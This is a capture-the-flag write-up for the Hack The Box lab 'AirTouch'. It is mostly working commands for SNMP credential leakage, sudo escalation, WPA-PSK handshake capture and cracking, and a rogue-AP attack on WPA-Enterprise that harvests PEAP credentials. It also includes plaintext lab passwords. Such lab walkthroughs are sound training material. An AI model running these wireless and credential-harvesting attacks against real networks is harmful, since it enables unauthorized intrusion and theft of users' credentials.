# HTB: AirTouch

**Difficulty:** Medium
**OS:** Linux
**Category:** WiFi / Wireless Attacks
**Target IP:** 10.129.8.35

---

## 1. Reconnaissance

### Nmap / RustScan
```bash
sudo nmap -sC -Pn -O 10.129.8.35
sudo nmap -sS -sV 10.129.8.35
sudo nmap -sU --top-ports 100 -sV 10.129.8.35
rustscan --ulimit 10000 -a 10.129.8.35 -- -A -sC
```

**Open ports:**
| Port | Protocol | Service |
|---|---|---|
| 22 | TCP | SSH (OpenSSH 8.2p1 Ubuntu 4ubuntu0.11) — offered an `ssh-rsa` key |
| 68 | UDP | DHCP client |
| 161 | UDP | SNMP |

No web service responded on the IP directly:
```bash
curl 10.129.8.35
```
Gobuster against the IP also returned nothing:
```bash
gobuster dir -u http://10.129.8.35 -w /usr/share/wordlists/seclists/Discovery/Web-Content/dictionary-list-2.3-small.txt -t 50
```

This confirmed there was no web attack surface — SSH and SNMP were the only usable services.

### SSH probing
```bash
ssh airtouch@10.129.8.35
```
Returned a password prompt rather than a key-based challenge, ruling out an immediate key-auth path.

---

## 2. SNMP Enumeration → SSH Foothold

With SNMP (UDP/161) open, ran `net-snmp`'s `snmpwalk` against the target using the default `public` community string:

```bash
sudo apt install net-snmp
snmpwalk -v2c -c public 10.129.8.35
```

This dumped a large amount of information, including a plaintext password. It wasn't valid for `admin`, but worked for a different account:

```bash
ssh consultant@airtouch.htb
```

Authenticated as `consultant@AirTouch-Consultant`. Escalated to a root shell immediately via a permissive sudo rule:

```bash
sudo /bin/bash -p
```

This root shell on the consultant box is the platform used for all of the wireless attacks that follow — it has `airodump-ng`, `aircrack-ng`, and `eaphammer` pre-staged.

---

## 3. Wireless Recon

Identified nearby wireless networks and their BSSIDs:

```bash
airodump-ng wlan0
```

Returned 5 BSSIDs, including networks later identified as `AirTouch-Office`, `AirTouch-Internet`, and management infrastructure.

---

## 4. Cracking `AirTouch-Internet` (WPA-PSK)

Used **eaphammer** to capture a handshake against the PSK-secured network:

```bash
cd /root/eaphammer
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid AirTouch-Office
```

> **Note:** the capture needs to run for a short period to actually collect traffic — running it and immediately killing it left an empty `/root/eaphammer/loot` folder on the first few attempts.

Ran a second capture specifically against the PSK network:
```bash
./eaphammer --bssid F0:9F:C2:A3:F1:A7 --essid AirTouch-Internet --channel 6 \
  --wpa-version2 --auth wpa-psk --interface wlan1 --creds
```

### Cracking the handshake
```bash
aircrack-ng -w wordlists/rockyou.txt -b F0:9F:C2:A3:F1:A7 /root/eaphammer/loot/wpa----.hccapx
```

**Result:** PSK cracked → `challenge`

### Joining the network
Created a `wpa_supplicant.conf`:
```ini
ctrl_interface=/run/wpa_supplicant
update_config=1
country=US

network={
    ssid="AirTouch-Internet"
    psk="challenge"
    key_mgmt=WPA-PSK
}
```

```bash
wpa_supplicant -i wlan0 -c wpa.conf -B
dhclient
ip a
```

Received an address on the `192.168.x.x` VLAN, alongside a visible internal host at `192.168.3.1`.

### Pivoting in
```bash
ssh user@192.168.3.1
```

Authenticated using credentials sourced from a `login.php` page — normally this would require a web credential sniff on the wireless segment, but the value was shared by a community member during the challenge. Landed a shell as `user@AirTouch-AP-PSK`.

```bash
cd ~
cat user.txt
```

**User flag captured.** ✅

---

## 5. Root — Rogue AP Against `AirTouch-Office` (WPA-EAP)

### Recovering certificate material
Back on `AirTouch-AP-PSK`, checked the home directory:
```bash
cd ~
ls
```

Found a `certs-backup` directory containing `.conf`, `.crt`, `.csr`, `.key`, and `.ext` files. Copied these off for use in staging a rogue access point.

### Standing up a rogue AP
Back on the `AirTouch-Consultant` root shell, recreated the certificate files under `/root/eaphammer/serv/`:
- `server.key`
- `server.crt`
- `ca.crt`

Imported them into eaphammer:
```bash
./eaphammer --cert-wizard import --server-cert serv/server.crt --private-key serv/server.key --ca-cert serv/ca.crt
```

Confirmed success via `Root privs confirmed!` and generation of `/root/eaphammer/certs/server/AirTouch CA.pem`.

### Capturing EAP credentials
```bash
./eaphammer --bssid AC:88:A9:F3:A1:13 --essid AirTouch-Office --channel 44 \
  --auth wpa-eap --interface wlan1 --creds
```

Output confirmed `wlan1` was taken over from NetworkManager. Let the capture run to collect EAP authentication attempts against the rogue AP.

> **Note:** Kill any previously running `wpa_supplicant` process (`ps aux` → `kill`) before starting a new one, or the new connection attempt will silently fail.

### Connecting with captured credentials
Created a new `wpa_supplicant.conf` for the EAP network, using the identity/password recovered from the rogue AP capture against `AirTouch-Office`:

```ini
ctrl_interface=/var/run/wpa_supplicant
update_config=0

network={
    ssid="AirTouch-Office"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="AirTouch\r4ulcl"
    password="laboratory"
    phase2="auth=MSCHAPV2"
    ca_cert="/root/eaphammer/serv/ca.crt"
    eapol_flags=0
}
```

```bash
wpa_supplicant -i wlan0 -c wpa_supplicant.conf -B
dhclient wlan0
```

This placed the attacker interface on the `10.x.x.x` management VLAN.

### Final pivot to admin
```bash
ssh remote@10.10.10.1
```

Authenticated with a credential sourced from the same community assist noted earlier. Landed a shell as `remote@AirTouch-AP-MGT`.

```bash
su admin
whoami
```

Confirmed as `admin`.

```bash
cd /root
cat root.txt
```

**Root flag captured.** ✅

---

## Summary of Attack Chain

1. Recon shows only SSH (22) and SNMP (161/UDP) reachable — no web attack surface
2. SNMP with the default `public` community string leaks a plaintext credential
3. Credential grants SSH access as `consultant`; a permissive sudo rule gives an immediate root shell on the consultant box
4. That root shell hosts wireless attack tooling (`airodump-ng`, `eaphammer`, `aircrack-ng`)
5. Capture + crack the `AirTouch-Internet` WPA-PSK handshake (`challenge`) and join that network
6. Pivot via SSH into an internal host on that VLAN using leaked web-app credentials → **user flag**
7. A `certs-backup` folder on that host provides certificate material for the WPA-EAP network
8. Stand up a rogue AP impersonating `AirTouch-Office` using the recovered certs
9. Capture a legitimate EAP/PEAP authentication attempt against the rogue AP, recover identity/credentials
10. Join `AirTouch-Office` using the captured EAP credentials → pivot to the management VLAN
11. SSH to the management host, `su admin` → **root flag**

## Key Takeaways
- **Default SNMP community strings (`public`/`private`) are still a real foothold vector** — always check before moving on to more complex attacks.
- **Certificate material left behind on a compromised host can be repurposed to impersonate legitimate infrastructure** — here, recovered certs enabled standing up a convincing rogue AP against a WPA-Enterprise network.
- **WPA-Enterprise (802.1X/PEAP) is only as strong as certificate validation on the client side** — a rogue AP with a plausible-looking CA and matching SSID/BSSID can successfully harvest MSCHAPv2 credentials if clients aren't strict about validating the server certificate.
- This box highlights a realistic segmented-network scenario: cracking one WLAN only grants access to a user-tier VLAN, while a second, harder WPA-Enterprise network gates the actual management/admin plane.
